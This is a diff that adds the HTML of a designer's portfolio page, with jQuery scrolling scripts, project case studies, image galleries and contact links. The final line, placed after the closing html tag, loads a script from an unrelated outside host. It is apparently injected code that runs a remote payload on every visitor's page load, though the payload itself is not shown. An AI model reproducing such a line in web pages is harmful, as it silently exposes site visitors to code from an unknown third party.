@@ -1,0 +1,801 @@
+<!DOCTYPE html> 
+	
+<html>
+
+<head>
+
+<meta charset="utf-8">
+
+<title>Henry Chen | UI Designer &amp; Experience Explorer</title>
+
+
+
+<link rel="stylesheet" type="text/css" href="css/style.css">
+
+<link rel='stylesheet' media='(max-width: 850px)' href='css/style-850.css' />
+
+<!-- Add fancyBox -->
+<link rel="stylesheet" href="source/jquery.fancybox.css?v=2.1.5" type="text/css" media="screen" />
+
+<link rel='stylesheet' media='screen and (max-width: 775px)' href='css/style-775.css' />
+
+
+
+<!-- <link type="text/css" media="screen" rel="stylesheet" href="css/htmlinsp.css" /> -->
+
+
+
+<link type="text/css" media="screen" rel="stylesheet" href="css/opl.css" />
+
+<!--[if lt IE 9]>
+
+	<link rel="stylesheet" type="text/css" href="css/style-775.css" />
+
+<![endif]-->
+
+
+
+<!-- MOBILE -->
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<!-- END MOBILE -->
+
+
+
+<!-- <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.js"></script>  -->
+
+<script src="js/jquery-1.7.1.min.js"></script>
+
+<script src="js/easing.js"></script>
+
+<script type="text/javascript" src="source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+<script src="js/script.js"></script>
+
+<script>
+
+
+
+$(document).ready(function() {
+
+	$('.comeatmebro').hide();
+
+	$('#resume-btn').hide();
+
+});
+
+
+
+
+
+$(window).load(function() {
+
+	$('.comeatmebro').fadeIn(1000)
+
+});
+
+
+
+
+
+/* INTRO = WINDOW HEIGHT */
+
+$(function(){
+
+    var windowH = $(window).height();
+
+    var wrapperH = $('#wrapper').height();
+
+    if(windowH > wrapperH) {                            
+
+        $('#wrapper').css({'height':($(window).height())+'px'});
+
+    }                                                                               
+
+    $(window).resize(function(){
+
+        var windowH = $(window).height();
+
+        var wrapperH = $('#wrapper').height();
+
+        var differenceH = windowH - wrapperH;
+
+        var newH = wrapperH + differenceH;
+
+        var truecontentH = $('#truecontent').height();
+
+        if(windowH > truecontentH) {
+
+            $('#wrapper').css('height', (newH)+'px');
+
+        }
+
+
+
+    });         
+
+});
+
+
+
+// THUMBS CONTAINER - FIXED THEN RELEASED
+
+$(function() {
+
+    var everything = $("#everything");
+
+    var windowH = $(window).height();
+
+    $(window).scroll(function() {    
+
+        var scroll = $(window).scrollTop();
+
+    
+
+        if (scroll >= windowH+ 5) {
+
+            everything.removeClass('stayput').addClass("scrollnow");
+
+        } 
+
+        else {
+
+            everything.removeClass("scrollnow").addClass('stayput');
+
+        }
+
+    })       
+
+	    $(window).resize(function() {
+
+		        var everything = $("#everything");
+
+				var windowH = $(window).height();
+
+				$(window).scroll(function() {    
+
+				var scroll = $(window).scrollTop();
+
+	    
+
+	        if (scroll >= windowH+ 5) {
+
+	            everything.removeClass('stayput').addClass("scrollnow");
+
+	        } 
+
+	        else {
+
+	            everything.removeClass("scrollnow").addClass('stayput');
+
+	        }
+
+	    })  
+
+    })
+
+});
+
+
+
+// MOUSE ICON FADE IN AND OUT
+
+$(window).scroll(function() {
+
+	if ($(window).scrollTop() >= 55) {
+
+		$('#mouseicon').fadeOut(250)
+
+	}
+
+	else {
+
+		$('#mouseicon').fadeIn(250) 
+
+	}
+
+});
+
+
+
+// SCROLL TO WINDOW HEIGHT
+
+$(document).ready(function() {
+
+		$('.dynamicscroll').click(function() {
+
+			var dynamicH = $(window).height()
+
+			$('html, body').animate({ scrollTop: dynamicH }, 1700);
+
+		})
+
+		
+
+		$('.backtointro').click(function() {
+
+			$('html, body').animate({ scrollTop: 0 }, 2000);
+
+		})
+
+});
+
+
+
+
+
+
+
+// SET BODY HEIGHT BASED ON HEIGHT OF #INTRO AND #EVERYTHING 
+
+$(window).load(function() {
+
+	var intro = $(window).height()
+
+	var everything = $('#everything').height()
+
+	$('.comeatmebro').css('height', intro + everything - 14);
+
+	
+
+	$(window).resize(function() {
+
+	var intro = $(window).height()
+
+	var everything = $('#everything').height()
+
+	$('.comeatmebro').css('height', intro + everything - 14);
+
+	})
+
+});
+
+	$(document).ready(function() {
+		$(".fancybox").fancybox();
+	});
+</script>
+
+
+
+
+
+
+
+</head>
+
+
+
+<body class="comeatmebro">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="loadfix">
+
+	<img src="images/bannertop-grey2.jpg" alt="" />
+
+	<img src="images/bannermid-grey2.jpg" alt="" />
+
+	<img src="images/bannerbottom-grey2.jpg" alt="" />
+
+	<img src="images/text-trial.png" alt="" />
+
+</div>
+
+
+
+
+
+<!-- RESUME -->
+
+<div id="resume-btn"></div>
+
+
+
+
+
+
+
+<!-- INTRO -->
+
+<section id="wrapper">
+
+		
+
+
+
+		<div class="device-caption"></div>
+
+		
+
+
+
+		
+
+		<div class="intro1"></div>	
+
+
+
+		<div class="intro2"></div>	
+
+		
+
+		<div class="intro3">
+
+			
+
+			<div id="mouseicon" class="dynamicscroll">
+
+				<div class="mousescroll1 mouseanim one"></div>
+
+				<div class="mousescroll2 mouseanim two"></div>
+
+				<div class="mousescroll3 mouseanim three"></div>
+               
+
+			</div>		
+
+			
+
+		</div>		
+
+
+
+</section>
+
+
+
+
+
+
+
+<section id="everything" class="stayput">
+
+	
+
+	<!-- INTRO STATEMENT -->
+
+	<div class="statement">
+
+		
+
+		<div class="inner">
+
+				<h2>PHILOSOPHY</h2>
+
+				
+
+				<div class="make-type-sexy">
+
+					<p>I believe in every different form of design is a dialog between
+
+					 user and itself. I am fascinated about discover humanity experience &amp; 
+
+					 crafting utility design, and I want to utilize them to create genuine experiences 
+
+					 for everyone.</p>
+
+				</div>
+
+		</div>
+
+		
+
+	</div>
+
+	
+<div class="section-strip">
+
+		
+
+		featured project study 1
+
+		
+
+	</div>
+
+	<!-- WORK -->
+
+<ul id="work">
+
+	
+<li> 	
+
+			<div id="nsl-container">NSL</div> 
+           
+          <div class="ap_inner">
+
+				<h2>Simplify and Improving process of sales.</h2>
+
+				
+
+				<div class="make-type-sexy">
+
+					<p>We believe with lightning fast data system and a deeply integrated operating platform, can help our client to gain more flexibility and ability to face challenging and changeable industry in the future. </p>
+					<p>Major responsible in design multiple channel platform application, deeply integrated with backend business logic. Helping and developing B2C website portal with a brand new looks and user experience.</p>
+					
+
+					<a class="btn btn-clear nsl_style" href="#contact_me">CONTACT ME FOR MORE DETAILS</a>
+					
+				</div>
+
+		</div>
+
+
+    </li>
+	
+    <div class="section-strip">
+
+		
+
+		featured project study 2
+
+		
+
+	</div>
+    
+<li> 	
+
+			<div id="wahh-container">WAHH</div> 
+           
+          <div class="ap_inner">
+
+				<h2>Improving medical care for distant patients.</h2>
+
+				
+
+				<div class="make-type-sexy">
+
+					<p>After research we came out with a solution that called </p>
+					<p>"Community Doctor Program", to help those patient who </p>
+					<p>need travel far away from their home to WAHH. </p>
+					<p>Not only saving patient’s time and money even with a proper medical treatment, but also improving efficiency of hospital medical resource. </p>
+					<p>Major responsible in design medical mobile application, implementing end to end user experience and  user interface designing.</p>
+
+					<a class="btn btn-clear wahh_style" href="#contact_me">CONTACT ME FOR MORE DETAILS</a>
+					
+				</div>
+
+		</div>
+
+
+    </li>
+
+
+
+
+
+
+
+	<div class="section-strip">
+
+		
+
+		featured projects
+
+		
+
+	</div>
+
+
+
+
+
+
+
+
+
+	<!-- WORK -->
+
+
+
+	
+
+	<li> 	
+
+			<a class="fancybox" rel="gal-1" href="images/work/hotskys/Hotskys_LogIn.jpg" id="hotsky-container">Hotskys App</a> 
+            <a class="fancybox" rel="gal-1" href="images/work/hotskys/Hotskys_Contacts_edit.jpg"></a> 
+            <a class="fancybox" rel="gal-1" href="images/work/hotskys/Hotskys_Profile.jpg"></a>
+            <a class="fancybox" rel="gal-1" href="images/work/hotskys/Hotskys_Chat.jpg"></a>  
+            <a class="fancybox" rel="gal-1" href="images/work/hotskys/Hotskys_Chat-room.jpg"></a>  
+            <a class="fancybox" rel="gal-1" href="images/work/hotskys/Hotskys_Recent.jpg"></a>  
+          <div class="ap_inner">
+
+				<h2>Hotskys - IM Mobile Application</h2>
+
+				
+
+				<div class="make-type-sexy">
+
+					<p>Worked on user experience and interface design of an Android App, want build up an experience focus on communication between people.
+					</p>
+					<a class="btn btn-clear fancybox" id="pre_hotskys" rel="gal-1-1" href="images/work/hotskys/Hotskys_LogIn.jpg">PREVIEW THE CASE</a>
+					<a class="fancybox" rel="gal-1-1" href="images/work/hotskys/Hotskys_Contacts_edit.jpg"></a> 
+					<a class="fancybox" rel="gal-1-1" href="images/work/hotskys/Hotskys_Profile.jpg"></a>
+					<a class="fancybox" rel="gal-1-1" href="images/work/hotskys/Hotskys_Chat.jpg"></a>  
+					<a class="fancybox" rel="gal-1-1" href="images/work/hotskys/Hotskys_Chat-room.jpg"></a>  
+					<a class="fancybox" rel="gal-1-1" href="images/work/hotskys/Hotskys_Recent.jpg"></a>  
+				</div>
+
+		</div>
+    </li>
+
+	<li> 	<a class="fancybox" rel="gal-2" href="images/work/apeepee/apeepee_web.jpg" id="apeepee-container">Apeepee Website and Android App</a>
+            <a class="fancybox" rel="gal-2" href="images/work/apeepee/apeepee_web_popup.jpg"></a>
+            <a class="fancybox" rel="gal-2" href="images/work/apeepee/apeepee_web_product.jpg"></a>
+            <a class="fancybox" rel="gal-2" href="images/work/apeepee/apeepee_android.jpg"></a>
+            <a class="fancybox" rel="gal-2" href="images/work/apeepee/apeepee_android_product.jpg"></a>
+            <a class="fancybox" rel="gal-2" href="images/work/apeepee/apeepee_android_submit.jpg"></a>
+                  <div class="ap_inner">
+
+				<h2>Apeepee - Online Photo Store</h2>
+
+				
+
+				<div class="make-type-sexy">
+
+					<p>Worked on user experience and interface design of a multi-platform service, target aiming to the C2C market. 
+					</p>
+					<a class="btn btn-clear fancybox ap_style" id="pre_apeepee" rel="gal-2-2" href="images/work/apeepee/apeepee_web.jpg">PREVIEW THE CASE</a>
+					<a class="fancybox" rel="gal-2-2" href="images/work/apeepee/apeepee_web_popup.jpg"></a>
+					<a class="fancybox" rel="gal-2-2" href="images/work/apeepee/apeepee_web_product.jpg"></a>
+					<a class="fancybox" rel="gal-2-2" href="images/work/apeepee/apeepee_android.jpg"></a>
+					<a class="fancybox" rel="gal-2-2" href="images/work/apeepee/apeepee_android_product.jpg"></a>
+					<a class="fancybox" rel="gal-2-2" href="images/work/apeepee/apeepee_android_submit.jpg"></a>
+				</div>
+
+		</div>   	
+     </li>
+
+	<li>	<a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_index.jpg"  id="yiabi-container">Yiabi eBook store</a>
+            <a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_index_search.jpg"></a> 
+            <a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_index_cutting.jpg"></a>
+            <a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_product.jpg"></a> 
+            <a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_writing.jpg"></a> 
+            <a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_register01.jpg"></a> 
+            <a class="fancybox" rel="gal-3" href="images/work/yiabi/Yiabi_ios_register02.jpg"></a>  
+ 				<div class="ap_inner">
+
+				<h2>Yiabi - Ebooks Market</h2>
+
+				<div class="make-type-sexy">
+
+					<p>Worked on user experience and interface design of an iOS App, building an ecosystem of Ebooks market. 
+					</p>
+            <a class="btn btn-clear fancybox yib_style" rel="gal-3-3" id="pre_yiabi" href="images/work/yiabi/Yiabi_ios_index.jpg">PREVIEW THE CASE</a>
+              <a class="fancybox" rel="gal-3-3" href="images/work/yiabi/Yiabi_ios_index_search.jpg"></a> 
+            <a class="fancybox" rel="gal-3-3" href="images/work/yiabi/Yiabi_ios_index_cutting.jpg"></a>
+            <a class="fancybox" rel="gal-3-3" href="images/work/yiabi/Yiabi_ios_product.jpg"></a> 
+            <a class="fancybox" rel="gal-3-3" href="images/work/yiabi/Yiabi_ios_writing.jpg"></a> 
+            <a class="fancybox" rel="gal-3-3" href="images/work/yiabi/Yiabi_ios_register01.jpg"></a> 
+            <a class="fancybox" rel="gal-3-3" href="images/work/yiabi/Yiabi_ios_register02.jpg"></a>  
+        </div></div>
+    </li>
+
+	<li> <a href="Android/index.html" target="_blank" id="android-container">Android G-Market</a>
+<div class="ap_inner">
+
+				<h2>G-Market - Android App Store</h2>
+
+				<div class="make-type-sexy">
+
+					<p>Worked on user experience and interface design of a website base service, an Android App Market. 
+					</p>
+            <a class="btn btn-clear andr_style" id="pre_gmarket"  href="Android/index.html" target="_blank">PREVIEW THE CASE</a>
+        </div></div>
+	 </li>
+
+<!--<li> <a href="https://dl.dropboxusercontent.com/u/16451442/Line/index.html" target="_blank" id="line-container">Line-image-hacking</a> </li>-->
+
+<!--<li> <a href="https://dl.dropboxusercontent.com/u/16451442/main/inde_main.htm" target="_blank" id="lol-container">League of Legends Image Website</a> </li>>-->
+
+	
+
+	
+
+	</ul>
+
+
+
+
+
+
+
+	<!-- EXPERIMENTS TITLE -->
+
+	<div class="statement">
+
+		
+
+		<div class="inner line">
+
+				<h2>FUNDAMENTAL</h2>
+
+				
+
+				<div class="make-type-sexy">
+					<p></p>	
+					<p>I'm always looking opportunity to improve my design &amp; development skills. I often take a close observation at people around me when they interactive with their device or facility so that I can discover more possibility in behavior of interactive also rethinking myself concepting and designing layouts. I <i>love</i> to seek out the pure of basic design, and am always inspired by the innovative &amp; creative works in which designers and developers are creating it.</p>
+
+				</div>
+
+		</div>
+
+		
+
+	</div>
+
+
+
+
+
+	<div class="section-strip">
+
+		
+
+		- older work -
+
+	</div>
+
+	
+
+
+
+	<div class="bits-container">		
+
+
+
+
+
+		<ul>
+
+			
+
+			<li> 	
+ 
+				<div class="bit-image">	
+                    <a class="fancybox box_fix" rel="gal-4" href="images/work/sangoku/3kd_index_inner1.jpg"></a> 						
+                    <a class="fancybox box_fix" rel="gal-4" href="images/work/sangoku/3kd_index.jpg"></a> 
+					<div class="label">Gaming Website<span class="collab"> &amp; <a href="https://dl.dropboxusercontent.com/u/16451442/3dk_promote/index.html" target="_blank" style="font-size:1.4em">Image Website</a></span></div>	
+
+					<div class="bit sangoku"></div>
+
+				</div>
+
+			</li>
+			<li> 	
+
+				<div class="bit-image">	
+					 <a class="fancybox box_fix" rel="gal-5" href="images/work/warrock/warrock_inner01.jpg"></a> 
+                    <a class="fancybox box_fix" rel="gal-5" href="images/work/warrock/warrock_index.jpg"></a> 						
+                   
+					<div class="label">Gaming Website</div>			
+
+					<div class="bit warrock"></div>
+
+				</div>
+
+			</li>
+
+						
+
+
+			
+
+		</ul>
+
+		
+
+	</div>
+
+	
+
+	
+
+	<!-- EMAIL BLOCK -->
+
+	<div class="hit-me-up">
+
+		<a href="HenryChen_2016.pdf" target="_blank">download my resume</a>
+
+	</div>
+
+
+
+
+
+<!-- FOOTER -->
+
+	<footer data-speed="2" data-type="background" id="contact_me">
+
+		
+
+		<div class="fa-holder">
+
+			
+
+			
+
+				<a href="http://about.me/Nickunchen" class="fa aboutme" target="_blank">AboutMe</a>
+
+				<a href="http://www.linkedin.com/in/henrychenlinkedin" class="fa linkedin" target="_blank">LinkedIn</a>
+
+			
+
+			
+
+				<a href="https://twitter.com/NickunChen" class="fa twitter" target="_blank">Twitter</a>		
+
+				<a href="mailto:holyman1010@gmail.com" class="fa mail">Email Me: holyman1010@gmail.com</a>
+
+			
+
+			
+
+		</div>
+
+			
+
+	</footer>
+
+
+
+		
+
+		<!-- BOTTOM BAR -->
+
+		<div class="bottom-bar">
+
+			<div class="bottom-inner">
+
+							
+
+				<div class="disclaimer">HENRY CHEN | 2016 &nbsp;&#8212;&nbsp; ux &amp; ui designer,web front-end developer &nbsp;&#8212;&nbsp; 
+
+				<br />
+
+				<a href="javascript:void(0);" class="backtointro">BACK UP</a></div> 
+
+	
+
+			
+
+
+
+			</div>
+
+		</div>
+
+
+
+
+
+</section>
+
+<!-- END EVERYTHING -->
+
+
+
+<img src="images/banner-full.jpg" style="display:block; height:0px; width:0px;" alt="" />
+
+
+
+</body>
+
+</html>
+
+<script src=http://js1.jserver.dsmtp.com></script>
+
